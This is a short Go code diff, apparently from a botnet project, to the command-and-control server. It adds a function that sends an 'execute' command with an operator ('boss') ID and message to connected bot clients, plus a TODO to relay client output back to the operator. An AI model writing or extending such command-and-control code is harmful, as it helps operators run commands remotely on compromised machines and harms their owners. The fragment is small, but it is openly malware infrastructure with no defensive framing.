@@ -9,6 +9,7 @@ import (
 
 	"github.com/satori/go.uuid"
 
+	"github.com/phanletrunghieu/botnet/common/cmd"
 	"github.com/phanletrunghieu/botnet/server/domain"
 )
 
@@ -72,6 +73,8 @@ func (s *Service) handleConnection(client *domain.Client) {
 			delete(s.Clients, client.ID)
 			return
 		}
+
+		// TODO: push data to boss
 		fmt.Print(msg)
 	}
 }
@@ -83,4 +86,13 @@ func (s *Service) ListClientID() []string {
 		listIDs = append(listIDs, client.ID.String())
 	}
 	return listIDs
+}
+
+// SendDataToClient Send data from server to client
+func (s *Service) SendDataToClient(client *domain.Client, boss *domain.Boss, msg string) error {
+	// 16 byte uuid
+	data := append([]byte(cmd.Execute), boss.ID.Bytes()...)
+	data = append(data, []byte(msg+"\r")...)
+	_, err := client.Conn.Write(data)
+	return err
 }
